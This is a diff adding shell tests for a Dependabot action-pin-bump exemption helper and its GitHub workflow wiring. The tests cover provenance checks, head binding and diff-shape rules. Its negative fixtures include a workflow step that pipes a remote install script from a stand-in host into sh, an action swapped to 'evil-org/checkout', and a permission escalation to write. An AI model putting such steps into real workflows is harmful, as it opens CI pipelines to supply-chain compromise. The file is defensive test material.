@@ -421,5 +421,503 @@ else
   fail "expected provenance re-check after each head pin (got $recheck_before_merge) and a trusted-gated approve step"
 fi
 
+# ---------------------------------------------------------------------------
+# Dependabot action-pin bump lane (#2164): the ONE predicate behind the
+# `.github/**` protected-path carve-out, scripts/workflow/
+# dependabot_pin_bump_exemption.sh, driven against a PATH-shimmed gh serving
+# the live PR object, the PR commits list and the PR files list. Both
+# directions are covered: a provenance-verified, pin-only diff is exempt; a
+# non-pin hunk, a non-workflow file, a non-Dependabot author, a foreign commit,
+# an unreadable read, a head move, or a payload not bound to the pinned head is
+# not.
+# ---------------------------------------------------------------------------
+PIN_HELPER="$ROOT/scripts/workflow/dependabot_pin_bump_exemption.sh"
+PIN_DIR="$WORK/pin"
+mkdir -p "$PIN_DIR/bin"
+PIN_HEAD=cccccccccccccccccccccccccccccccccccccccc
+PIN_BASE=dddddddddddddddddddddddddddddddddddddddd
+PIN_OTHER=eeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee
+
+if [ -x "$PIN_HELPER" ]; then
+  pass "pin-bump exemption helper is present and executable"
+else
+  fail "missing or non-executable helper: $PIN_HELPER"
+fi
+
+cat >"$PIN_DIR/bin/gh" <<'SHIM'
+#!/usr/bin/env bash
+set -euo pipefail
+printf '%s\n' "$*" >>"$PIN_LOG"
+case "$1 ${2:-}" in
+  "api --paginate")
+    case "$3" in
+      repos/owner/repo/pulls/1/commits\?per_page=100)
+        [ "${PIN_MODE:-}" != unreadable-commits ] || { echo "HTTP 502" >&2; exit 1; }
+        cat "$PIN_COMMITS"
+        ;;
+      repos/owner/repo/pulls/1/files\?per_page=100)
+        [ "${PIN_MODE:-}" != unreadable-files ] || { echo "HTTP 502" >&2; exit 1; }
+        cat "$PIN_FILES"
+        ;;
+      *) echo "gh shim: unexpected paginated endpoint: $3" >&2; exit 91 ;;
+    esac
+    ;;
+  "api repos/owner/repo/pulls/1")
+    [ "${PIN_MODE:-}" != pr-read-fails ] || { echo "HTTP 500" >&2; exit 1; }
+    reads=$(grep -c '^api repos/owner/repo/pulls/1$' "$PIN_LOG" || true)
+    if [ "${PIN_MODE:-}" = head-moves ] && [ "$reads" -ge 2 ]; then
+      cat "$PIN_PR_MOVED"
+    else
+      cat "$PIN_PR"
+    fi
+    ;;
+  *) echo "gh shim: unexpected command: $*" >&2; exit 93 ;;
+esac
+SHIM
+chmod +x "$PIN_DIR/bin/gh"
+
+pin_pr_json() {  # <author> <head> <base>
+  jq -nc --arg a "$1" --arg h "$2" --arg b "$3" '{user:{login:$a}, head:{sha:$h}, base:{sha:$b}}'
+}
+pin_pr_json 'dependabot[bot]' "$PIN_HEAD" "$PIN_BASE" >"$PIN_DIR/pr.json"
+pin_pr_json 'dependabot[bot]' "$PIN_OTHER" "$PIN_BASE" >"$PIN_DIR/pr-moved.json"
+pin_pr_json 'someone-with-push' "$PIN_HEAD" "$PIN_BASE" >"$PIN_DIR/pr-human.json"
+pin_pr_json 'dependabot-lookalike' "$PIN_HEAD" "$PIN_BASE" >"$PIN_DIR/pr-lookalike.json"
+printf '[%s]\n' "$(prov_commit "$PIN_HEAD" 'dependabot[bot]' web-flow true)" >"$PIN_DIR/commits-trusted.json"
+printf '[%s,%s]\n' "$(prov_commit "$PIN_OTHER" 'dependabot[bot]' web-flow true)" \
+  "$(prov_commit "$PIN_HEAD" someone-with-push someone-with-push false)" >"$PIN_DIR/commits-foreign.json"
+
+# One PR files entry. The contents_url ref is what binds a files payload to
+# the pinned head, so the builder takes the ref explicitly.
+pin_file() {  # <filename> <patch> <additions> <deletions> [status] [ref] [previous_filename]
+  jq -nc --arg f "$1" --arg p "$2" --argjson a "$3" --argjson d "$4" \
+    --arg s "${5:-modified}" --arg ref "${6:-$PIN_HEAD}" --arg prev "${7:-}" '
+    {filename:$f, status:$s, additions:$a, deletions:$d, changes:($a+$d), patch:$p,
+     contents_url:("https://api.github.com/repos/owner/repo/contents/" + ($f | @uri) + "?ref=" + $ref)}
+    | if $prev != "" then . + {previous_filename:$prev} else . end'
+}
+
+# The real #2133 diff: one SHA-pinned action bump with its pin comment.
+PATCH_REAL='@@ -356,7 +356,7 @@ jobs:
+
+       - name: Download the inert read-only handoff
+         if: steps.source.outputs.requires_relay == '"'"'true'"'"' && steps.artifact.outputs.found == '"'"'true'"'"'
+-        uses: actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c  # v8.0.1
++        uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333  # v8.0.2
+         with:
+           name: codex-p1-read-only-handoff-${{ steps.source.outputs.pr }}
+           path: ${{ runner.temp }}/codex-p1-read-only-handoff'
+# Two pins in one hunk, one of them the `- uses:` list-item form and a tag pin.
+PATCH_TWO='@@ -10,6 +10,6 @@ jobs:
+     steps:
+-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
++      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.2
+         with:
+           persist-credentials: false
+-      - uses: actions/setup-node@v4
++      - uses: actions/setup-node@v5
+       - run: npm ci'
+# A pin bump plus a new step in the same hunk.
+PATCH_NEW_STEP='@@ -10,4 +10,5 @@ jobs:
+     steps:
+-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
++      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.2
++      - run: curl -sSf https://example.invalid/install.sh | sh
+         with:
+           persist-credentials: false'
+# Balanced at the file level (two additions, two deletions) but not within a
+# hunk: a pin bump plus a new step in one hunk, a deleted step in another.
+PATCH_UNBALANCED='@@ -10,3 +10,4 @@ jobs:
+     steps:
+-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
++      - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.2
++      - run: curl -sSf https://example.invalid/install.sh | sh
+         with:
+@@ -30,3 +31,2 @@ jobs:
+       - run: npm ci
+-      - run: npm test
+       - run: npm run lint'
+# The uses: target itself changes, not only its pin.
+PATCH_TARGET='@@ -10,3 +10,3 @@ jobs:
+     steps:
+-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
++      - uses: evil-org/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.1
+         with:'
+# A one-for-one line replacement that is not a pin line at all.
+PATCH_WITH='@@ -12,3 +12,3 @@ jobs:
+         with:
+-          persist-credentials: false
++          persist-credentials: true
+       - run: npm ci'
+# A permissions block (one-for-one, so additions == deletions) is not a pin.
+PATCH_PERMISSIONS='@@ -3,3 +3,3 @@ on:
+ permissions:
+-  contents: read
++  contents: write
+ jobs:'
+# The pin line moves to a different indentation: text before `@` differs.
+PATCH_INDENT='@@ -10,3 +10,3 @@ jobs:
+     steps:
+-      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
++        - uses: actions/checkout@08c6903cd8c0fde910a37f88322edcfb5dd907a8 # v7.0.2
+         with:'
+# A pin bump on the last line of a file that gains its trailing newline.
+PATCH_EOF='@@ -30,2 +30,2 @@ jobs:
+       - name: Tail
+-        uses: actions/cache@0400d5f644dc74513175e3cd8d07132dd4860809 # v4.2.0
+\ No newline at end of file
++        uses: actions/cache@d4323d4df104b026a6aa633fdb11d772146be0bf # v4.2.2'
+
+pin_files() {  # <entry json>... -> array file
+  printf '%s\n' "$@" | jq -sc '.'
+}
+
+run_pin() {  # <pr json> <commits json> <files json|-> <mode> [extra helper args...]
+  local pr=$1 commits=$2 files=$3 mode=$4
+  shift 4
+  : >"$PIN_DIR/gh.log"
+  local files_arg=()
+  if [ "$files" != - ]; then
+    files_arg=(--files-json "$files")
+  fi
+  ( cd "$ROOT" && PATH="$PIN_DIR/bin:$PATH" PIN_LOG="$PIN_DIR/gh.log" \
+      PIN_PR="$pr" PIN_PR_MOVED="$PIN_DIR/pr-moved.json" PIN_COMMITS="$commits" \
+      PIN_FILES="${files/#-/$PIN_DIR/files-real.json}" PIN_MODE="$mode" \
+      bash "$PIN_HELPER" --repo owner/repo --pr 1 "${files_arg[@]}" "$@" )
+}
+
+pin_case() {  # <label> <expected rc> <expected status> <reason substring> <pr> <commits> <files|-> <mode> [args...]
+  local label=$1 want_rc=$2 want_status=$3 want_reason=$4
+  shift 4
+  local out rc=0 status reason
+  set +e
+  out=$(run_pin "$@" 2>"$PIN_DIR/stderr")
+  rc=$?
+  set -e
+  status=$(printf '%s' "$out" | jq -r '.status // "<no json>"' 2>/dev/null || echo '<no json>')
+  reason=$(printf '%s' "$out" | jq -r '.reason // ""' 2>/dev/null || true)
+  if [ "$rc" -eq "$want_rc" ] && [ "$status" = "$want_status" ] && [[ "$reason" == *"$want_reason"* ]]; then
+    pass "pin-bump: $label"
+  else
+    fail "pin-bump: $label (rc=$rc want $want_rc; status=$status want $want_status; reason=$reason; stderr=$(cat "$PIN_DIR/stderr"))"
+  fi
+  # The helper's JSON report, for callers that assert on its shape.
+  printf '%s' "$out" >"$PIN_DIR/last.json"
+}
+
+# Write a files fixture and print its path, so a case can inline its payload.
+pin_fixture() {  # <name> <entry json>...
+  local name=$1
+  shift
+  pin_files "$@" >"$PIN_DIR/files-$name.json"
+  printf '%s' "$PIN_DIR/files-$name.json"
+}
+
+pin_fixture real "$(pin_file .github/workflows/codex-feedback-archive-relay.yml "$PATCH_REAL" 1 1)" >/dev/null
+pin_fixture two "$(pin_file .github/workflows/ci.yml "$PATCH_TWO" 2 2)" \
+  "$(pin_file .github/workflows/release.yaml "$PATCH_REAL" 1 1)" >/dev/null
+
+# --- exempt ----------------------------------------------------------------
+pin_case "the real #2133 one-line SHA pin bump is exempt" 0 exempt "1 pin(s) across 1 workflow file(s)" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok \
+  --head "$PIN_HEAD" --base "$PIN_BASE" --config "$ROOT/.github/review-policy.yml"
+if jq -e --arg h "$PIN_HEAD" --arg b "$PIN_BASE" '
+     .exempt == true and .head == $h and .base == $b and .author == "dependabot[bot]" and .pins == 1
+     and .files == [{filename:".github/workflows/codex-feedback-archive-relay.yml", pins:1}]
+     and (.provenance | test("signature verified"))' "$PIN_DIR/last.json" >/dev/null; then
+  pass "pin-bump: the exempt report names the verified pair, the provenance verdict and the pinned files"
+else
+  fail "pin-bump: exempt report shape is wrong: $(cat "$PIN_DIR/last.json")"
+fi
+if grep -Fxq 'api --paginate repos/owner/repo/pulls/1/commits?per_page=100' "$PIN_DIR/gh.log" \
+   && [ "$(grep -c '^api repos/owner/repo/pulls/1$' "$PIN_DIR/gh.log")" -eq 2 ] \
+   && ! grep -Fq 'pulls/1/files' "$PIN_DIR/gh.log"; then
+  pass "pin-bump: provenance is read paginated, the live pair is read before and after the proof, and a cached files payload is not refetched"
+else
+  fail "pin-bump: unexpected gh call shape: $(cat "$PIN_DIR/gh.log")"
+fi
+
+pin_case "several pins across two files, list-item and tag forms included, are exempt" 0 exempt "3 pin(s) across 2 workflow file(s)" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-two.json" ok >/dev/null
+
+pin_case "without --files-json the files list is fetched and bound to the live head" 0 exempt "1 pin(s)" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" - ok >/dev/null
+if grep -Fxq 'api --paginate repos/owner/repo/pulls/1/files?per_page=100' "$PIN_DIR/gh.log"; then
+  pass "pin-bump: the uncached files read is paginated"
+else
+  fail "pin-bump: files read is not the paginated endpoint: $(cat "$PIN_DIR/gh.log")"
+fi
+
+# --- not exempt: diff shape --------------------------------------------------
+pin_case "a new step in the same hunk is not exempt" 1 not-exempt "a pin bump replaces lines one for one" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture new-step "$(pin_file .github/workflows/ci.yml "$PATCH_NEW_STEP" 2 1)")" ok >/dev/null
+pin_case "a file-balanced but hunk-unbalanced diff is not exempt" 1 not-exempt "hunk 1 removes 1 line(s) but adds 2" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture unbalanced "$(pin_file .github/workflows/ci.yml "$PATCH_UNBALANCED" 2 2)")" ok >/dev/null
+pin_case "a changed uses: target is not exempt" 1 not-exempt "changes the uses: target" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture target "$(pin_file .github/workflows/ci.yml "$PATCH_TARGET" 1 1)")" ok >/dev/null
+pin_case "a with: value change is not exempt" 1 not-exempt "not an action pin" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture with "$(pin_file .github/workflows/ci.yml "$PATCH_WITH" 1 1)")" ok >/dev/null
+pin_case "a permissions change is not exempt" 1 not-exempt "not an action pin" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture perm "$(pin_file .github/workflows/ci.yml "$PATCH_PERMISSIONS" 1 1)")" ok >/dev/null
+pin_case "a pin bump mixed with a non-pin hunk in another file is not exempt" 1 not-exempt "not an action pin" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture mixed "$(pin_file .github/workflows/a.yml "$PATCH_REAL" 1 1)" "$(pin_file .github/workflows/b.yml "$PATCH_WITH" 1 1)")" ok >/dev/null
+pin_case "a re-indented pin line is not exempt" 1 not-exempt "changes the uses: target" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture indent "$(pin_file .github/workflows/ci.yml "$PATCH_INDENT" 1 1)")" ok >/dev/null
+pin_case "an end-of-file newline change is not exempt" 1 not-exempt "end-of-file newline" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture eof "$(pin_file .github/workflows/ci.yml "$PATCH_EOF" 1 1)")" ok >/dev/null
+pin_case "a pin bump outside .github/workflows is not exempt" 1 not-exempt "not a .github/workflows/*.yml file" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture action "$(pin_file .github/actions/local/action.yml "$PATCH_REAL" 1 1)")" ok >/dev/null
+pin_case "a pin bump plus a non-workflow file is not exempt" 1 not-exempt "package.json is not a .github/workflows/*.yml file" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture pkg "$(pin_file .github/workflows/a.yml "$PATCH_REAL" 1 1)" "$(pin_file package.json "$PATCH_WITH" 1 1)")" ok >/dev/null
+pin_case "an added workflow file is not exempt" 1 not-exempt "status added, not modified" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture added "$(pin_file .github/workflows/new.yml "$PATCH_REAL" 1 0 added)")" ok >/dev/null
+pin_case "a renamed workflow file is not exempt" 1 not-exempt "is a rename" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture renamed "$(pin_file .github/workflows/new.yml "$PATCH_REAL" 1 1 renamed "$PIN_HEAD" .github/workflows/old.yml)")" ok >/dev/null
+pin_case "a file whose patch the API omitted is not exempt" 1 not-exempt "has no patch text" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture nopatch "$(pin_file .github/workflows/ci.yml "" 1 1)")" ok >/dev/null
+pin_case "a files list that disagrees with its own patch is not exempt" 1 not-exempt "1 pin pair(s) in the patch but the API reports 2" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture miscount "$(pin_file .github/workflows/ci.yml "$PATCH_REAL" 2 2)")" ok >/dev/null
+printf '[]\n' >"$PIN_DIR/files-empty.json"
+pin_case "an empty files list is not exempt" 1 not-exempt "changes no files" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-empty.json" ok >/dev/null
+
+# --- not exempt: who, not what ---------------------------------------------
+pin_case "a non-Dependabot author is not exempt before any proof is attempted" 1 not-exempt "not dependabot[bot]" \
+  "$PIN_DIR/pr-human.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok >/dev/null
+if ! grep -Fq 'pulls/1/commits' "$PIN_DIR/gh.log"; then
+  pass "pin-bump: a non-Dependabot author short-circuits before the provenance read"
+else
+  fail "pin-bump: provenance was read for a non-Dependabot author"
+fi
+pin_case "a lookalike login is not dependabot[bot]" 1 not-exempt "'dependabot-lookalike', not dependabot[bot]" \
+  "$PIN_DIR/pr-lookalike.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok >/dev/null
+pin_case "a foreign commit on the branch is not exempt even with a pin-only diff" 1 not-exempt "not Dependabot-only" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-foreign.json" "$PIN_DIR/files-real.json" ok >/dev/null
+printf 'dependabot:\n  reviewer_gate:\n    enabled: true\n  pin_bump_exemption:\n    enabled: false  # opted out\n' >"$PIN_DIR/policy-off.yml"
+pin_case "a governing policy that opts out is honored" 1 not-exempt "opted out" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-off.yml" >/dev/null
+printf 'dependabot:\n  pin_bump_exemption:\n    enabled: "true"\n' >"$PIN_DIR/policy-quoted.yml"
+pin_case "a quoted enabled: \"true\" still enables the lane" 0 exempt "1 pin(s)" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-quoted.yml" >/dev/null
+printf 'dependabot:\n  reviewer_gate:\n    enabled: true\n' >"$PIN_DIR/policy-absent.yml"
+pin_case "an absent pin_bump_exemption block defaults to enabled" 0 exempt "1 pin(s)" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-absent.yml" >/dev/null
+printf 'dependabot:\n  pin_bump_exemption:\n    enabled: maybe\n' >"$PIN_DIR/policy-bad.yml"
+pin_case "a malformed enabled: value fails closed as unreadable" 3 unreadable "must be true or false" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --config "$PIN_DIR/policy-bad.yml" >/dev/null
+
+# --- unreadable: no verdict, fail closed ----------------------------------
+pin_case "an unreadable commits list is not a verdict" 3 unreadable "could not be verified" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" unreadable-commits >/dev/null
+pin_case "an unreadable files list is not a verdict" 3 unreadable "failed to fetch PR files" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" - unreadable-files >/dev/null
+pin_case "an unreadable live PR is not a verdict" 3 unreadable "failed to read PR" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" pr-read-fails >/dev/null
+pin_case "a live head that is not the pinned head is not a verdict" 3 unreadable "not the pinned head" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --head "$PIN_OTHER" >/dev/null
+pin_case "a live base that is not the pinned base is not a verdict" 3 unreadable "not the pinned base" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok --base "$PIN_OTHER" >/dev/null
+pin_case "a head that moves during the proof is not a verdict" 3 unreadable "moved from" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" head-moves >/dev/null
+pin_case "a files payload bound to another head is not a verdict" 3 unreadable "contents_url ref mismatch" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture otherhead "$(pin_file .github/workflows/ci.yml "$PATCH_REAL" 1 1 modified "$PIN_OTHER")")" ok >/dev/null
+pin_case "a files payload with no head binding at all is not a verdict" 3 unreadable "contents_url ref mismatch" \
+  "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" \
+  "$(pin_fixture unbound "$(pin_file .github/workflows/ci.yml "$PATCH_REAL" 1 1 | jq -c 'del(.contents_url)')")" ok >/dev/null
+
+# Usage errors are neither verdicts nor unreadable reads.
+set +e
+( cd "$ROOT" && bash "$PIN_HELPER" --repo owner/repo --pr 1 --head short >/dev/null 2>&1 ); rc=$?
+set -e
+if [ "$rc" -eq 2 ]; then
+  pass "pin-bump: a malformed --head is a usage error (rc 2)"
+else
+  fail "pin-bump: malformed --head rc=$rc, want 2"
+fi
+
+# ---------------------------------------------------------------------------
+# Workflow wiring for the lane (#2164). The labeler must run the helper from
+# the TRUSTED helper tree with the governing base config and its already-
+# fetched files payload, carve out only the protected-path reason, and never
+# remove a label; the trusted auto-clear path must run the helper from the
+# default-branch checkout on BOTH clearing loops, before the merge-gate
+# evaluation, mapping an unreachable verdict to the infrastructure sentinel.
+# ---------------------------------------------------------------------------
+PRP_WORKFLOW="$ROOT/.github/workflows/pr-review-policy.yml"
+AUTO_CLEAR_WORKFLOW="$ROOT/.github/workflows/auto-clear-blocking-labels.yml"
+if command -v yq >/dev/null 2>&1 && [ -r "$PRP_WORKFLOW" ] && [ -r "$AUTO_CLEAR_WORKFLOW" ]; then
+  CLASSIFIER=$(yq -r '.jobs."external-review-labeling".steps[] | select(.id == "check") | .run' "$PRP_WORKFLOW")
+  if grep -Fq 'PIN_HELPER="$TRUSTED_HELPER_DIR/dependabot_pin_bump_exemption.sh"' <<<"$CLASSIFIER" \
+     && grep -Fq -- '--config "$TRUSTED_CONFIG"' <<<"$CLASSIFIER" \
+     && grep -Fq -- '--files-json "$FILES_JSON"' <<<"$CLASSIFIER" \
+     && grep -Fq -- '--head "$HEAD_SHA"' <<<"$CLASSIFIER" \
+     && grep -Fq -- '--base "$BASE_SHA"' <<<"$CLASSIFIER" \
+     && grep -Fq "[ \"\$PR_AUTHOR\" = 'dependabot[bot]' ]" <<<"$CLASSIFIER"; then
+    pass "labeler runs the pin-bump helper from the trusted helper tree, pinned to the event pair, with the governing base config"
+  else
+    fail "labeler must invoke dependabot_pin_bump_exemption.sh from \$TRUSTED_HELPER_DIR with --head/--base/--config/--files-json"
+  fi
+  if grep -Fq '(.lines_changed < .threshold) and (.reasons | length) == 1 and (.reasons[0] | startswith("protected paths modified: "))' <<<"$CLASSIFIER"; then
+    pass "labeler carves out only the protected-path reason (threshold and capped reads keep the label)"
+  else
+    fail "labeler must require the protected-path rule to be the ONLY external-review reason before consulting the lane"
+  fi
+  if ! grep -Fq -- '--remove-label' <<<"$CLASSIFIER"; then
+    pass "labeler classifier removes no label on the pin-bump path"
+  else
+    fail "the classifier body must not remove labels"
+  fi
+  # The exempt arm publishes a no-review classification and stops before the
+  # carry-forward and clearance logic; its evidence travels on a step output.
+  exempt_arm=$(awk '/Dependabot pin-bump lane: VERIFIED at head/{f=1} f{print} f && /^[[:space:]]*;;[[:space:]]*$/{exit}' <<<"$CLASSIFIER")
+  if grep -Fq 'echo "needs_review=false" >> "$GITHUB_OUTPUT"' <<<"$exempt_arm" \
+     && grep -Fq 'echo "classification=dependabot-pin-bump" >> "$GITHUB_OUTPUT"' <<<"$exempt_arm" \
+     && grep -Fq 'echo "dependabot_pin_bump=true" >> "$GITHUB_OUTPUT"' <<<"$exempt_arm" \
+     && grep -Fq 'echo "dependabot_pin_bump_evidence=$PIN_JSON" >> "$GITHUB_OUTPUT"' <<<"$exempt_arm" \
+     && grep -Fq '>> "${GITHUB_STEP_SUMMARY:-/dev/stderr}"' <<<"$exempt_arm" \
+     && grep -Eq '^[[:space:]]*exit 0[[:space:]]*$' <<<"$exempt_arm"; then
+    pass "labeler's exempt arm classifies dependabot-pin-bump, exports the evidence, writes the check summary and stops"
+  else
+    fail "labeler's exempt arm is incomplete: $exempt_arm"
+  fi
+  LANE_IF=$(yq -r '.jobs."external-review-labeling".steps[] | select(.name == "Dependabot action-pin bump lane") | .if' "$PRP_WORKFLOW")
+  LANE_TOKEN=$(yq -r '.jobs."external-review-labeling".steps[] | select(.name == "Dependabot action-pin bump lane") | .env.GH_TOKEN' "$PRP_WORKFLOW")
+  LANE_RUN=$(yq -r '.jobs."external-review-labeling".steps[] | select(.name == "Dependabot action-pin bump lane") | .run' "$PRP_WORKFLOW")
+  if [ "$LANE_IF" = "steps.check.outputs.dependabot_pin_bump == 'true'" ] \
+     && [ "$LANE_TOKEN" = '${{ secrets.GITHUB_TOKEN }}' ] \
+     && ! grep -Fq -- '--remove-label' <<<"$LANE_RUN" \
+     && ! grep -Fq 'DELETE' <<<"$LANE_RUN" \
+     && ! grep -Fq 'LABEL_REMOVAL_TOKEN' <<<"$LANE_RUN" \
+     && grep -Fq 'gh api --paginate "repos/$REPO/issues/$PR_NUMBER/comments"' <<<"$LANE_RUN"; then
+    pass "labeler's diagnostic step runs only on an exempt classification, under GITHUB_TOKEN, paginates its dedupe read and removes nothing"
+  else
+    fail "labeler's diagnostic step must be gated on the exempt output, GITHUB_TOKEN-only, paginated and write-free apart from its marker comment"
+  fi
+
+  # Execute the diagnostic step against a stubbed gh: one marker per pair,
+  # fenced on the live pair, never a label write.
+  LANE_DIR="$WORK/lane"
+  mkdir -p "$LANE_DIR/bin"
+  printf '%s\n' "$LANE_RUN" >"$LANE_DIR/step.sh"
+  cat >"$LANE_DIR/bin/gh" <<'SHIM'
+#!/usr/bin/env bash
+set -euo pipefail
+printf '%s\n' "$*" >>"$LANE_LOG"
+case "$*" in
+  "api --paginate repos/owner/repo/issues/1/comments --jq .[].body")
+    cat "$LANE_COMMENTS" ;;
+  "api repos/owner/repo/pulls/1 --jq {head:.head.sha,base:.base.sha}")
+    [ "${LANE_MODE:-}" != pair-read-fails ] || exit 1
+    cat "$LANE_PAIR" ;;
+  "pr comment 1 --repo owner/repo --body-file "*)
+    cat "$7" >>"$LANE_DIR/comment-writes"
+    printf '\n---\n' >>"$LANE_DIR/comment-writes" ;;
+  *) echo "gh shim: unexpected command: $*" >&2; exit 90 ;;
+esac
+SHIM
+  chmod +x "$LANE_DIR/bin/gh"
+  run_lane() {  # <comments file> <pair file> <mode> <evidence json>
+    : >"$LANE_DIR/gh.log"
+    rm -f "$LANE_DIR/comment-writes"
+    env PATH="$LANE_DIR/bin:$PATH" LANE_LOG="$LANE_DIR/gh.log" LANE_DIR="$LANE_DIR" \
+        LANE_COMMENTS="$1" LANE_PAIR="$2" LANE_MODE="$3" EVIDENCE="$4" \
+        GH_TOKEN=fake PR_NUMBER=1 REPO=owner/repo HEAD_SHA="$PIN_HEAD" BASE_SHA="$PIN_BASE" \
+        bash "$LANE_DIR/step.sh" >"$LANE_DIR/out" 2>"$LANE_DIR/err"
+  }
+  LANE_EVIDENCE=$(cat "$PIN_DIR/last.json" 2>/dev/null || true)
+  if ! jq -e '.exempt == true' <<<"$LANE_EVIDENCE" >/dev/null 2>&1; then
+    # Re-derive a known-exempt report for the harness.
+    pin_case "harness evidence: the real pin bump is exempt" 0 exempt "1 pin(s)" \
+      "$PIN_DIR/pr.json" "$PIN_DIR/commits-trusted.json" "$PIN_DIR/files-real.json" ok >/dev/null
+    LANE_EVIDENCE=$(cat "$PIN_DIR/last.json")
+  fi
+  LANE_MARKER="<!-- mergepath-dependabot-pin-bump:v1 verified-head=$PIN_HEAD verified-base=$PIN_BASE -->"
+  : >"$LANE_DIR/no-comments.txt"
+  printf '%s\n' "some earlier comment" "$LANE_MARKER" >"$LANE_DIR/marker-present.txt"
+  jq -n --arg h "$PIN_HEAD" --arg b "$PIN_BASE" '{head:$h,base:$b}' >"$LANE_DIR/pair-current.json"
+  jq -n --arg h "$PIN_OTHER" --arg b "$PIN_BASE" '{head:$h,base:$b}' >"$LANE_DIR/pair-moved.json"
+  printf '{"head":"nope","base":"%s"}\n' "$PIN_BASE" >"$LANE_DIR/pair-malformed.json"
+
+  if run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-current.json" ok "$LANE_EVIDENCE" \
+     && grep -Fq "$LANE_MARKER" "$LANE_DIR/comment-writes" \
+     && grep -Fq 'signature verified' "$LANE_DIR/comment-writes" \
+     && grep -Fq 'codex-feedback-archive-relay.yml' "$LANE_DIR/comment-writes" \
+     && [ "$(grep -c -- '---' "$LANE_DIR/comment-writes")" -eq 1 ] \
+     && ! grep -Eq 'remove-label|DELETE' "$LANE_DIR/gh.log"; then
+    pass "diagnostic step posts one marker comment naming the pair, the provenance and the pinned file, and touches no label"
+  else
+    fail "diagnostic step did not publish as expected (out=$(cat "$LANE_DIR/out") err=$(cat "$LANE_DIR/err") log=$(cat "$LANE_DIR/gh.log"))"
+  fi
+  if run_lane "$LANE_DIR/marker-present.txt" "$LANE_DIR/pair-current.json" ok "$LANE_EVIDENCE" \
+     && [ ! -f "$LANE_DIR/comment-writes" ]; then
+    pass "diagnostic step is idempotent per verified pair"
+  else
+    fail "diagnostic step re-posted or failed with a marker already present (err=$(cat "$LANE_DIR/err"))"
+  fi
+  if run_lane "$LANE_DIR/no-comments.txt" "$LANE_DIR/pair-moved.json" ok "$LANE_EVIDENCE" \
+     && [ ! -f "$LANE_DIR/comment-writes" ] && grep -Fq 'moved from' "$LANE_DIR/out"; then
+    pass "diagnostic step skips a stale pair without writing"
+  else
+    fail "diagnostic step wrote or failed on a moved pair (out=$(cat "$LANE_DIR/out") err=$(cat "$LANE_DIR/err"))"
+  fi
+  set +e
